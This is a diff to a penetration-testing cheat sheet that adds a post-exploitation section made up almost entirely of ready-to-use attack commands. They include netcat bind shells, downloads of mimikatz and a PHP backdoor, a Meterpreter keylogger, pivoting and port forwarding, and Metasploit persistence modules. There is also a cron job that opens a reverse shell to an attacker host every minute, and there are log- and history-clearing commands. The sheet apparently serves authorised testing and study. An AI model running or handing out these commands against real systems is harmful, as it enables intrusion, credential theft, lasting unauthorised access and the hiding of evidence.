@@ -1,4 +1,4 @@
-# PENETRATION TEST
+# Penetration test
 
 ## Information Gathering
 
@@ -82,4 +82,66 @@ mysql -h <hostname> -u root -p # with password
 # 3389 - RDP
 xfreerdp /v:<ip> /u:<username> /p:<password> # Connect to RDP
 auxiliary/scanner/rdp/rdp_scanner # Metasploit (If you are not sure that specific port runs rdp)
+```
+
+
+
+## Post-Exploitation
+
+```sh
+# Bind Shell
+nc -nvlp <PORT> -e cmd.exe or nc.exe -nvlp <PORT> -e cmd.exe # Windows (target)
+nc -nvlp <PORT> -e /bin/bash # Linux (target)
+nc -nv <IP> <PORT> # Linux (attacker)
+nc.exe -nv <IP> <PORT> # Windows (attacker)
+
+# Transfer files
+certutil -urlcache -f http://<host>/mimikatz.exe mimikatz.exe # Windows
+wget http://<host>/backdoor.php # Linux
+# Netcat
+nc -nvlp 1234 > test.txt # recepient
+nc -nv <ip> <port> < test.txt # sender
+
+# Interactive shell
+/bin/bash -i # Linux
+
+# Fully interactive shell
+# 1 step
+python3 -c 'import pty;pty.spawn("/bin/bash")' # or 
+python -c 'import pty;pty.spawn("/bin/bash")'
+# 2 step 
+Press CTRL + Z # to background process and get back to your host machine
+# 3 step
+stty raw -echo; fg
+# 4 step
+export TERM=xterm
+
+# Keylogger (Metasploit)
+keyscan_start # start keylogger
+keyscan_dump # print captured strokes
+
+# Pivoting (meterpreter)
+run autoroute -s <subnet> # subnet of the internal network
+run autoroute -p # Displays active routing table.
+
+# Port forwarding (meterpreter/metasploit)
+portfwd add -l 1234 -p 80 -r <target_sys_2_ip> # port 80 of the target 2
+portfwd list
+nmap -sV -sC -p 1234 localhost
+
+# Persistence 
+# Windows
+exploit/windows/local/persistence_service # [metasploit] search "persistence" example
+post/windows/manage/enable_rdp # [metasploit] windows persistence by enabling rdp (Require user & pass. No pass? change or crack it) 
+run getgui -e -u user_you_want -p password_you_want # [meterpreter] (automatic Enables RDP & creates user & other thing)
+# Linux example
+post/linux/manage/sshkey_persistence # [metasploit] search "persistence" example
+# Linux cron jobs
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" > cron # create a cronjob (every minute time format)
+crontab -i cron
+crontab -l # crontab for the current user
+
+# Clearing tracks
+clearev # Windows (meterpreter)
+history -c # Linux
 ```
